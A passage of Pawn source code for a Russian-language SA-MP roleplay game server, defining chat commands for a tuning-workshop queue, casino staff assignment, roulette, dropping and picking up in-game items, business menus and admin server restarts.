	SetVehiclePos(GetPlayerVehicleID(playerid),WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][0],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][1],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][2]);
	DeletePVar(GetPVarInt(playerid,"installation_"),"cost");
	DeletePVar(GetPVarInt(playerid,"installation_"),"prods");
	DeletePVar(GetPVarInt(playerid,"installation_"),"detals");
	DeletePVar(GetPVarInt(playerid,"installation_"),"color0");
	DeletePVar(GetPVarInt(playerid,"installation_"),"color1");
	SaveTuning(GetPVarInt(playerid,"installation_"),CarInfo[GetPVarInt(playerid,"installation_")][carColor_two][GetPVarInt(GetPVarInt(playerid,"installation_"), "chosencar")]);
	DeletePVar(playerid,"installation");
	DeletePVar(GetPVarInt(playerid,"installation_"),"mechanic");
	new x = GetPVarInt(playerid,"Workshop");
	for(new x_ = 0; x_ < 9; x_++)
	{
		WorkshopList[x_][x][wlID] = WorkshopList[x_+1][x][wlID];
		strmid(WorkshopList[x_][x][wlName],WorkshopList[x_+1][x][wlName],0,strlen(WorkshopList[x_+1][x][wlName]), MAX_PLAYER_NAME);
		WorkshopList[x_+1][x][wlID] = -1;
		strmid(WorkshopList[x_+1][x][wlName],"", 0, strlen(""), 5);
	}
	if(WorkshopList[0][x][wlID] != -1 && strlen(WorkshopList[0][x][wlName]))
	{
		SCM(WorkshopList[0][x][wlID],COLOR_BLUE,"Подошла ваша очередь. У вас есть 2 минуты что бы прибыть к гаражу!");
		SetPVarInt(WorkshopList[0][x][wlID],"w_time", gettime() + 120);
		SetPlayerCheckpoint(WorkshopList[0][x][wlID],WorkshopInfo[x][wMenu][0],WorkshopInfo[x][wMenu][1],WorkshopInfo[x][wMenu][2], 10.0);
	}
	DeletePVar(GetPVarInt(playerid,"installation_"),"w_time");
	DeletePVar(GetPVarInt(playerid,"installation_"),"w_id");
	DeletePVar(GetPVarInt(playerid,"installation_"),"InWorkshop");
	return DeletePVar(playerid,"installation_");
}
CMD:addtunnequeue(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0 || !GetPVarInt(playerid,"Workshop")) return true;
	if(GetPVarInt(playerid,"Workshop__") < 2) return SCM(playerid,COLOR_GREY," Вы не можете добавлять в очередь");
	if(!PlayerToPoint(10, playerid,1496.0302,1308.6653,1093.2892)) return SCM(playerid,-1, " Необходимо находиться в автомастерской");
	if(sscanf(params, "u",params[0])) return	SCM(playerid, -1, " Введите: /addtunnequeue [id]");
	if(!ProxDetectorS(8.0, playerid, params[0])) return true;
	new null = -1, null_ = 0;
	for(new i = 9; i >= 0; i--)
	{
		if(!strlen(WorkshopList[i][GetPVarInt(playerid,"Workshop")][wlName])) null = i;
		if(strcmp(WorkshopList[i][GetPVarInt(playerid,"Workshop")][wlName],PTEMP[params[0]][pName],true) == 0 && strlen(WorkshopList[i][GetPVarInt(playerid,"Workshop")][wlName])) null_++;
	}
	if(null == -1) return SCM(playerid,COLOR_GREY," Очередь заполнена!");
	if(null_ > 0) return SCM(playerid,COLOR_GREY," Игрок уже ждет свою очередь!");
	SetPVarInt(params[0], "w_id",GetPVarInt(playerid,"Workshop"));
	WorkshopList[null][GetPVarInt(playerid,"Workshop")][wlID] = params[0];
	strmid(WorkshopList[null][GetPVarInt(playerid,"Workshop")][wlName],PTEMP[params[0]][pName],0,strlen(PTEMP[params[0]][pName]), 32);
	SendMes(playerid,COLOR_BLUE," Вы добавили игрока %s в очередь!", PTEMP[params[0]][pName]);
	if(null == 0)
	{
		SetPVarInt(params[0], "w_time", gettime() + 120);
		SCM(params[0],COLOR_BLUE," Механик добавил вас в очередь. У вас есть 2 минуты что бы прибыть к гаражу!");
		SetPlayerCheckpoint(params[0],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][0],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][1],WorkshopInfo[GetPVarInt(playerid,"Workshop")][wMenu][2], 10.0);
	}
	else SCM(params[0],COLOR_BLUE," Механик добавил вас в очередь");
	return true;
}
/*CMD:setmemgroup(playerid, params[])
{
	if(!PTEMP[playerid][pLogin] || PTEMP[playerid][pLeader] != 4) return true;
	if(sscanf(params, "ud", params[0x0],params[0x1]) || params[0x1] < 0 || params[0x1] > 3 || params[0x0] == playerid) return SCM(playerid, -1," Введите: /setmemgroup [playerid] [подразделение]"), SCM(playerid, -1, "0. LS | 1. SF | 2. LV");
	if(PTEMP[params[0x0]][pMember] != 4) return SCM(playerid,COLOR_GREY,"Данный игрок не состоит в МЧС");
	new null[0x5];
	if(params[0x1] == 0) null = "LS";
	else if(params[0x1] == 1) null = "SF";
	else if(params[0x1] == 2) null = "LV";
	SendMes(params[0x0],COLOR_BLUE,"%s назначил вас контролировать участок МЧС %s!",PTEMP[playerid][pName],null);
	SendMes(playerid,COLOR_BLUE," Вы назначили %s контролировать участок МЧС %s!",PTEMP[params[0x0]][pName],null);
	PTEMP[params[0x0]][pRank] = 9;
	PTEMP[params[0x0]][pJobHeal] = params[0x1];
	return true;
}*/
CMD:slimit(playerid, params[])
{
	if(!PTEMP[playerid][pLogin] || IsANoLimiter(playerid)) return true;
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SCM(playerid, COLOR_GREY, " Необходимо быть зарулём!");
	if(PTEMP[playerid][pDrivingSkill] > 1 && PTEMP[playerid][pAdmin] <= 0) return SCM(playerid,COLOR_GREY," Ваш навык недостаточно высок!");
	switch(PTEMP[playerid][pDrivingSkill])
	{
	case 0: PTEMP[playerid][pDrivingSkill] = 1, PlayerTextDrawSetString(playerid,LimitShow[playerid],"~r~MAX");
	case 1: PTEMP[playerid][pDrivingSkill] = 0, PlayerTextDrawSetString(playerid,LimitShow[playerid],"MAX");
	}
	return true;
}
CMD:createdonate(playerid, params[])
{
	if(!PTEMP[playerid][pLogin] || PTEMP[playerid][pAdmin] < 9) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /createdonate [сумма]");
	new donate[2]; donate[0] = 10000 + random(99999), donate[1] = 10000 + random(99999);
	mysql_format(DATABASE,QUERY, 300, "INSERT INTO `"TABLE_DONATE"` (`code_one`, `code_two`, `name`, `money`) VALUES ('%i', '%i', 'NONE', '%i')",donate[0], donate[1], params[0]);
	mysql_function_query(DATABASE,QUERY,false,"","");
	printf("Администратор %s создал донат коды: [ONE: %i] [TWO: %i]", Name(playerid), donate[0], donate[1]);
	return SendMes(playerid,COLOR_YELLOW," [Cod One: %i] [Cod Two: %i]", donate[0], donate[1]);
}
CMD:setcasinoowner(playerid, params[])
{
	if(!PTEMP[playerid][pLogin] || PTEMP[playerid][pAdmin] < 5) return true;
	if(sscanf(params, "dd",params[0x0], params[0x1])) return SCM(playerid, -1, " Введите: /setcasinoowner [id мафии] (6 - Yakuza | 5 - LCN | 14 - Russian Mafia) [id казино 1 - 4 dragons | 0 - caligula]");
	if(params[0x0] != 6 && params[0x0] < 0 && params[0x0] != 5 && params[0x0] != 14) return SCM(playerid,COLOR_GREY," Неверный ид");
	CasinoInfo[params[0x1]][caMafia] = params[0x0];
	printf("Администратор %s установил владельцем казино[%i] %i", Name(playerid), params[1], params[0]);
	return SCM(playerid,-1," Успешно! (/cinfo)");
}
CMD:setmng(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	for(new i = 1; i <= TOTALCASINO; i++)
	{
		if(!PlayerToPoint(200,playerid, CasinoInfo[i][caPos][0x0],CasinoInfo[i][caPos][0x1], CasinoInfo[i][caPos][0x2])) continue;
		if(PTEMP[playerid][pMember] != CasinoInfo[i][caMafia] || PTEMP[playerid][pRank] < 9) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция");
		if(sscanf(params, "ii",params[0x0],params[0x1]) || (params[0x0] == playerid && params[0x0] > -1)) return SCM(playerid, -1, " Введите: /setmng [playerid или -1] [слот 0 - 2]");
		if(params[0x0] > -1 && PTEMP[params[0x0]][pMember]) return SCM(playerid,COLOR_GREY," Этот человек состоит в организации!");
		switch(params[0x1])
		{
		case 0:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caManager],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Менеджера [%i]",PTEMP[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caManager],PTEMP[params[0x0]][pName], 0, strlen(PTEMP[params[0x0]][pName]), 32);
			}
		case 1:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caManager2],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Менеджера [%i]",PTEMP[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caManager2],PTEMP[params[0x0]][pName], 0, strlen(PTEMP[params[0x0]][pName]), 32);
			}
		case 2:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caManager3],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Менеджера [%i]",PTEMP[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caManager3],PTEMP[params[0x0]][pName], 0, strlen(PTEMP[params[0x0]][pName]), 32);
			}
		default: return SCM(playerid,COLOR_GREY," Неверный слот!");
		}
		SendMes(params[0x0], COLOR_BLUE, " %s назначил вас Менеджером казино [%i]",PTEMP[playerid][pName],params[0x1]);
		SendMes(playerid, COLOR_BLUE, " Вы назначили %s Менеджером казино [%i]",PTEMP[params[0x0]][pName],params[0x1]);
		printf("Игрок %s назначил %s менеджером[%i] казино №%i", Name(playerid), Name(params[0]), params[1], i);
	}
	return true;
}
CMD:cinvite(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	for(new i = 1; i <= TOTALCASINO; i++)
	{
		if(!PlayerToPoint(200,playerid, CasinoInfo[i][caPos][0x0],CasinoInfo[i][caPos][0x1], CasinoInfo[i][caPos][0x2])) continue;
		if(GetPVarInt(playerid,"CasinoRank") != 2) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция");
		if(sscanf(params, "ii",params[0x0],params[0x1]) || (params[0x0] == playerid && params[0x0] > -1)) return SCM(playerid, -1, " Введите: /cinvite [playerid (-1 для увольнения)] [слот (0 - 9)]");
		if(params[0x0] > -1 && PTEMP[params[0x0]][pMember]) return SCM(playerid,COLOR_GREY," Этот человек состоит в организации!");
		switch(params[0x1])
		{
		case 0:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caKrupie],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Крупье [%i]",PTEMP[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caKrupie],PTEMP[params[0x0]][pName], 0, strlen(PTEMP[params[0x0]][pName]), 32);
			}
		case 1:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caKrupie2],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Крупье [%i]",PTEMP[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caKrupie2],PTEMP[params[0x0]][pName], 0, strlen(PTEMP[params[0x0]][pName]), 32);
			}
		case 2:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caKrupie3],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Крупье [%i]",PTEMP[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caKrupie3],PTEMP[params[0x0]][pName], 0, strlen(PTEMP[params[0x0]][pName]), 32);
			}
		case 3:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caKrupie4],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Крупье [%i]",PTEMP[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caKrupie4],PTEMP[params[0x0]][pName], 0, strlen(PTEMP[params[0x0]][pName]), 32);
			}
		case 4:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caKrupie5],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Крупье [%i]",PTEMP[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caKrupie5],PTEMP[params[0x0]][pName], 0, strlen(PTEMP[params[0x0]][pName]), 32);
			}
		case 5:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caKrupie6],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Крупье [%i]",PTEMP[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caKrupie6],PTEMP[params[0x0]][pName], 0, strlen(PTEMP[params[0x0]][pName]), 32);
			}
		case 6:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caKrupie7],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Крупье [%i]",PTEMP[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caKrupie7],PTEMP[params[0x0]][pName], 0, strlen(PTEMP[params[0x6]][pName]), 32);
			}
		case 7:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caKrupie8],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Крупье [%i]",PTEMP[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caKrupie8],PTEMP[params[0x0]][pName], 0, strlen(PTEMP[params[0x0]][pName]), 32);
			}
		case 8:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caKrupie9],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Крупье [%i]",PTEMP[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caKrupie9],PTEMP[params[0x0]][pName], 0, strlen(PTEMP[params[0x0]][pName]), 32);
			}
		case 9:
			{
				if(params[0x0] == -1) return strmid(CasinoInfo[i][caKrupie10],"-", 0, strlen("-"), 32), SendMes(playerid, COLOR_BLUE, " Вы уволили %s с должности Крупье [%i]",PTEMP[params[0x0]][pName],params[0x1]);
				else strmid(CasinoInfo[i][caKrupie10],PTEMP[params[0x0]][pName], 0, strlen(PTEMP[params[0x0]][pName]), 32);
			}
		default: return SCM(playerid,COLOR_GREY," Неверный слот!");
		}
		SendMes(params[0x0], COLOR_BLUE, " %s назначил вас Крупье [%i]",PTEMP[playerid][pName],params[0x1]);
		SendMes(playerid, COLOR_BLUE, " Вы назначили %s Крупье [%i]",PTEMP[params[0x0]][pName],params[0x1]);
		printf("Игрок %s назначил %s крупье[%i] казино №%i", Name(playerid), Name(params[0]), params[1], i);
	}
	return true;
}
CMD:cinfo(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	for(new i = 1; i <= TOTALCASINO; i++)
	{
		if(!PlayerToPoint(200,playerid, CasinoInfo[i][caPos][0x0],CasinoInfo[i][caPos][0x1], CasinoInfo[i][caPos][0x2])) continue;
		new gaatext[24];
		switch(CasinoInfo[i][caMafia])
		{
		
		case 5: gaatext = "La Coca Nostra";
		case 6: gaatext = "Yakuza";
		case 14: gaatext = "Russian Mafia";
		}
		format(string, 500, "Казино: %s\n\nПод контролем: %s\n\n",CasinoInfo[i][caName],gaatext);
		format(string, 500, "%s\n\n[0] Менеджер: %s\n[1] Менеджер: %s\n[2] Менеджер: %s\n\n[0] Крупье: %s\n[1] Крупье: %s\n[2] Крупье: %s\n[3] Крупье: %s\n[4] Крупье: %s\n[5] Крупье: %s\n[6] Крупье: %s\n[7] Крупье: %s\n[8] Крупье: %s\n[9] Крупье: %s",string,CasinoInfo[i][caManager],CasinoInfo[i][caManager2],CasinoInfo[i][caManager3],CasinoInfo[i][caKrupie],CasinoInfo[i][caKrupie2],CasinoInfo[i][caKrupie3],CasinoInfo[i][caKrupie4],CasinoInfo[i][caKrupie5],
		CasinoInfo[i][caKrupie6],CasinoInfo[i][caKrupie7],CasinoInfo[i][caKrupie8],CasinoInfo[i][caKrupie9],CasinoInfo[i][caKrupie10]);
		ShowPlayerDialogEx(playerid,2145,DIALOG_STYLE_LIST,"Информация о Казино",string,"Закрыть","");
		break;
	}
	return true;
}
CMD:deal(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!GetPVarInt(playerid,"CasinoRank")) return true;
	if(GetPVarInt(playerid,"Roulet")) return SCM(playerid,COLOR_GREY," Вы уже запустили рулетку!");
	if(!GetRoulet(playerid)) return SCM(playerid,COLOR_GREY," В данном месте нет рулетки!");
	if(RouletPlay[GetRoulet(playerid)]) return SCM(playerid,COLOR_GREY," Рулетка уже запущена!");
	SetPVarInt(playerid,"Roulet",GetRoulet(playerid));
	RouletTimer[GetRoulet(playerid)][0x2] = random(80) + 70;
	RouletPlay[GetRoulet(playerid)] = true;
	RouletTimer[GetRoulet(playerid)][0x0] = SetTimerEx("RouletCheck",100,1,"d",GetRoulet(playerid));
	RouletKrupie[GetRoulet(playerid)] = playerid;
	return true;
}
CMD:pick(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new test = 0;
	for(new i = 0; i < SLOTVIBROS; i++)
	{
		if(PlayerToPoint(1.0,playerid,VibrosInfo[i][vX],VibrosInfo[i][vY],VibrosInfo[i][vZ]))
		{
			if(VibrosInfo[i][vModel] == 1)
			{
				if(PTEMP[playerid][pDrugs]+VibrosInfo[i][vKol] > 150)
				{
					SCM(playerid,COLOR_GREY," У вас не может быть больше 150 гр. наркотиков");
					break;
				}
				PTEMP[playerid][pDrugs]+=VibrosInfo[i][vKol];
				VibrosInfo[i][vModel] = 0;
				VibrosInfo[i][vTime] = -1;
				VibrosInfo[i][vX] = 0.0;
				VibrosInfo[i][vY] = 0.0;
				VibrosInfo[i][vZ] = 0.0;
				DestroyDynamic3DTextLabel(VibrosInfo[i][vPodnyat]);
				DestroyObject(VibrosInfo[i][vObject]);
				for(new ix = i; ix < SLOTVIBROS-1; ix++)
				{
					VibrosInfo[ix][vModel] = VibrosInfo[ix+1][vModel];
					VibrosInfo[ix][vTime] = VibrosInfo[ix+1][vTime];
					VibrosInfo[ix][vX] = VibrosInfo[ix+1][vX];
					VibrosInfo[ix][vY] = VibrosInfo[ix+1][vY];
					VibrosInfo[ix][vZ] = VibrosInfo[ix+1][vZ];
					DestroyDynamic3DTextLabel(VibrosInfo[ix+1][vPodnyat]);
					DestroyObject(VibrosInfo[ix+1][vObject]);
					if(VibrosInfo[ix][vModel] == 1)
					{
						VibrosInfo[ix][vPodnyat] = CreateDynamic3DTextLabel("Наркотики\nПоднять: {ffffff}/pick", COLOR_GREEN, VibrosInfo[ix][vX], VibrosInfo[ix][vY], VibrosInfo[ix][vZ], 10.0);
						VibrosInfo[ix][vObject] = CreateObject(1485,VibrosInfo[ix][vX],VibrosInfo[ix][vY],VibrosInfo[ix][vZ],0.00,0.00,0.00);
					}
					else
					{
						VibrosInfo[ix][vPodnyat] = CreateDynamic3DTextLabel("Материалы\nПоднять: {ffffff}/pick", COLOR_GREEN, VibrosInfo[ix][vX], VibrosInfo[ix][vY], VibrosInfo[ix][vZ], 10.0);
						VibrosInfo[ix][vObject] = CreateObject(1210,VibrosInfo[ix][vX],VibrosInfo[ix][vY],VibrosInfo[ix][vZ],0.00,0.00,0.00);
					}
				}
				SLOTVIBROS--;
				test++;
				SendMes(playerid,-1," Вы подняли %i грамм наркотиков",VibrosInfo[i][vKol]);
				break;
			}
			else if(VibrosInfo[i][vModel] == 2)
			{
				if(PTEMP[playerid][pMats]+VibrosInfo[i][vKol] > 500)
				{
					SCM(playerid,COLOR_GREY," У вас не может быть больше 500 материалов");
					break;
				}
				PTEMP[playerid][pMats]+=VibrosInfo[i][vKol];
				VibrosInfo[i][vModel] = 0;
				VibrosInfo[i][vTime] = -1;
				VibrosInfo[i][vX] = 0.0;
				VibrosInfo[i][vY] = 0.0;
				VibrosInfo[i][vZ] = 0.0;
				DestroyDynamic3DTextLabel(VibrosInfo[i][vPodnyat]);
				DestroyObject(VibrosInfo[i][vObject]);
				for(new ix = i; ix < SLOTVIBROS-1; ix++)
				{
					VibrosInfo[ix][vModel] = VibrosInfo[ix+1][vModel];
					VibrosInfo[ix][vTime] = VibrosInfo[ix+1][vTime];
					VibrosInfo[ix][vX] = VibrosInfo[ix+1][vX];
					VibrosInfo[ix][vY] = VibrosInfo[ix+1][vY];
					VibrosInfo[ix][vZ] = VibrosInfo[ix+1][vZ];
					DestroyDynamic3DTextLabel(VibrosInfo[ix+1][vPodnyat]);
					DestroyObject(VibrosInfo[ix+1][vObject]);
					if(VibrosInfo[ix][vModel] == 1)
					{
						VibrosInfo[ix][vPodnyat] = CreateDynamic3DTextLabel("Наркотики\nПоднять: {ffffff}/pick", COLOR_GREEN, VibrosInfo[ix][vX], VibrosInfo[ix][vY], VibrosInfo[ix][vZ], 10.0);
						VibrosInfo[ix][vObject] = CreateObject(1485,VibrosInfo[ix][vX],VibrosInfo[ix][vY],VibrosInfo[ix][vZ],0.00,0.00,0.00);
					}
					else
					{
						VibrosInfo[ix][vPodnyat] = CreateDynamic3DTextLabel("Материалы\nПоднять: {ffffff}/pick", COLOR_GREEN, VibrosInfo[ix][vX], VibrosInfo[ix][vY], VibrosInfo[ix][vZ], 10.0);
						VibrosInfo[ix][vObject] = CreateObject(1210,VibrosInfo[ix][vX],VibrosInfo[ix][vY],VibrosInfo[ix][vZ],0.00,0.00,0.00);
					}
				}
				SLOTVIBROS--;
				test++;
				SendMes(playerid,-1," Вы подняли %i материалов",VibrosInfo[i][vKol]);
				break;
			}
		}
	}
	if(test == 0) return SCM(playerid,COLOR_GREY," В данном месте нет объекта");
	return true;
}
CMD:drop(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(sscanf(params, "s[32]", params[0]))
	{
		ShowPlayerDialogEx(playerid,1426,DIALOG_STYLE_LIST, "Выбросить:","Выбросить наркотики\nВыбросить материалы", "Выбор", "Выход");
		SCM(playerid, -1, " Введите: /drop [значение] (Наркотики/Материалы)");
		return true;
	}
	if(strcmp(params[0], "наркотики",true) == 0)
	{
		if(PTEMP[playerid][pDrugs] < 1) return SCM(playerid,COLOR_GREY," У вас нет наркотиков!");
		if(SLOTVIBROS >= 900) return SCM(playerid,COLOR_GREY," В данный момент нельзя выбросить что либо");
		new Float:Xw,Float:Yw,Float:Zw;
		VibrosInfo[SLOTVIBROS][vModel] = 1;
		VibrosInfo[SLOTVIBROS][vTime] = GetTickCount();
		GetPlayerPos(playerid,Xw,Yw,Zw);
		VibrosInfo[SLOTVIBROS][vX] = Xw;
		VibrosInfo[SLOTVIBROS][vY] = Yw;
		VibrosInfo[SLOTVIBROS][vZ] = Zw-0.9;
		VibrosInfo[SLOTVIBROS][vPodnyat] = CreateDynamic3DTextLabel("Наркотики\nПоднять: {ffffff}/pick", COLOR_GREEN, VibrosInfo[SLOTVIBROS][vX], VibrosInfo[SLOTVIBROS][vY], VibrosInfo[SLOTVIBROS][vZ], 10.0);
		VibrosInfo[SLOTVIBROS][vKol] = PTEMP[playerid][pDrugs];
		VibrosInfo[SLOTVIBROS][vObject] = CreateObject(1485,VibrosInfo[SLOTVIBROS][vX],VibrosInfo[SLOTVIBROS][vY],VibrosInfo[SLOTVIBROS][vZ],0.00,0.00,0.00);
		SCM(playerid,COLOR_GREY," Вы выбросили наркотики на землю!");
		PTEMP[playerid][pDrugs] = 0;
		SLOTVIBROS++;
	}
	else if(strcmp(params[0], "материалы",true) == 0)
	{
		if(PTEMP[playerid][pMats] < 1) return SCM(playerid,COLOR_GREY," У вас нет материалов!");
		if(SLOTVIBROS >= 900) return SCM(playerid,COLOR_GREY," В данный момент нельзя выбросить что либо");
		new Float:Xw,Float:Yw,Float:Zw;
		VibrosInfo[SLOTVIBROS][vModel] = 2;
		VibrosInfo[SLOTVIBROS][vTime] = GetTickCount();
		GetPlayerPos(playerid,Xw,Yw,Zw);
		VibrosInfo[SLOTVIBROS][vX] = Xw;
		VibrosInfo[SLOTVIBROS][vY] = Yw;
		VibrosInfo[SLOTVIBROS][vZ] = Zw-0.9;
		VibrosInfo[SLOTVIBROS][vPodnyat] = CreateDynamic3DTextLabel("Материалы\nПоднять: {ffffff}/pick", COLOR_GREEN, VibrosInfo[SLOTVIBROS][vX], VibrosInfo[SLOTVIBROS][vY], VibrosInfo[SLOTVIBROS][vZ], 10.0);
		VibrosInfo[SLOTVIBROS][vKol] = PTEMP[playerid][pMats];
		VibrosInfo[SLOTVIBROS][vObject] = CreateObject(1210,VibrosInfo[SLOTVIBROS][vX],VibrosInfo[SLOTVIBROS][vY],VibrosInfo[SLOTVIBROS][vZ],90.00,0.00,0.00);
		SCM(playerid,COLOR_GREY," Вы выбросили материалы на землю!");
		PTEMP[playerid][pMats] = 0;
		SLOTVIBROS++;
	}
	return true;
}
CMD:unlockallkvart(playerid,params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	for(new i = 1; i <= ALLKVARTIRI; i++) if(kvartinfo[i][lock] == 1) kvartinfo[i][lock] = 0;
	printf("Администратор %s открыл все квартиры");
	return true;
}
CMD:bmenu(playerid,params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new i = PTEMP[playerid][pPBizzKey];
	if(PlayerToPoint(5, playerid,BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ]) || PlayerToPoint(5, playerid,BizzInfo[i][bBarX], BizzInfo[i][bBarY], BizzInfo[i][bBarZ]))
	{
		if(PTEMP[playerid][pLogin] == 0) return true;
		if(!BGet(playerid)) return SCM(playerid, COLOR_GREY, " Вы не владеете бизнесом");
		format(YCMDstr, sizeof(YCMDstr), "[0] Продать бизнес\n[1] Пополнить счет\n[2] Снять деньги\n[3] Баланс\n[4] Цена за товар\n[5] Цена за вход\n[6] Информация");
		ShowPlayerDialogEx(playerid, 1846, 2, "Бизнес", YCMDstr, "Выбрать", "Отмена");
		return true;
	}
	return true;
}
CMD:painlist(playerid,params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	string = "";
	format(string,144,"\tИмя\t\t\tУбийств\t\t\tСмертей\n___________________________________________________________________\n");
	for(new i = 0; i < Painlist; i++) format(YCMDstr, sizeof(YCMDstr), "\t%s\t\t\t%i\t\t\t%i\n",PaintStats[i][paName],PaintStats[i][paKills],PaintStats[i][paDeaths]), strcat(string, YCMDstr);
	if(Painlist > 0) return ShowPlayerDialogEx(playerid, 11349, DIALOG_STYLE_MSGBOX, "Победители", string, "Готово", "");
	SCM(playerid,COLOR_GREY," Список игроков пуст");
	return true;
}
CMD:racelist(playerid,params[])
{
	if(!PTEMP[playerid][pLogin]) return true;
	string = "";
	if(RaceList == 0) return SCM(playerid,COLOR_GREY," Список пуст!");
	new null, str[100];
	for(new i = 0; i < RaceList; i++)
	{
		null++;
		format(str,64,"%i. %s\n",null,RaceInfo[i][rName]);
		strcat(string,str);
	}
	return ShowPlayerDialogEx(playerid,0, DIALOG_STYLE_MSGBOX, "Список победителей", string, "Готово", "");
}
//#2
CMD:rr(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if (PTEMP[playerid][pAdmin] < 10 || dostup[playerid] == 0) return true;
	printf("Администратор %s запустил рестарт сервера (/rr)", Name(playerid));
 	restartServer(1);
	return true;
}
CMD:gmx(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if (PTEMP[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	printf("Администратор %s запустил рестарт сервера (/gmx)", Name(playerid));
	restartServer(0);
	return true;
}
CMD:restart(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 8) return true;
	if(serverRestart) serverRestart = false, SCM(playerid, COLOR_REDD, " Плановый рестарт сервера отключён"), printf("Администратор %s отключил плановый рестарт сервера", Name(playerid));
	else serverRestart = true, SCM(playerid, COLOR_GREEN, " Плановый рестарт сервера включён"), printf("Администратор %s включил плановый рестарт сервера", Name(playerid));
	return true;
}
CMD:clearreconnect(playerid,params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	ClearReconnect();
	SCM(playerid,-1," Reconnect лист очищен");
	printf("Администратор %s очистил Reconnect-list", Name(playerid));
	return true;
}
CMD:setallbizint(playerid,params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	for(new i = 1; i <= TotalBizz; i++)
	{
		if(BizzInfo[i][bType] == 3)
		{
			BizzInfo[i][bInterior] = 6;
			BizzInfo[i][bExitX] = -2240.4685;
			BizzInfo[i][bExitY] = 137.0604;
			BizzInfo[i][bExitZ] = 1035.4140;
			BizzInfo[i][bBarX] = -2236.1130;
			BizzInfo[i][bBarY] = 130.1580;
			BizzInfo[i][bBarZ] = 1035.4141;
			DestroyDynamicPickup(BizzInfo[i][bExitPic]);
			BizzInfo[i][bExitPic] = CreatePickup(19132, 23, BizzInfo[i][bExitX], BizzInfo[i][bExitY], BizzInfo[i][bExitZ],BizzInfo[i][bVirtualWorld]);
		}
	}
	SCM(playerid,-1," Бизнесы по интерьерам распределены");
	printf("Администратор %s респределил интерьеры по бизнесами", Name(playerid));
	return true;
}
CMD:buycar(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pCarLic] != 1) return SCM(playerid,-1, " У вас нет Лицензии на управление авто");
	if(!HGet(playerid) && !KGet(playerid)) return SCM(playerid,COLOR_GREY, " Вы не имеете дома!");
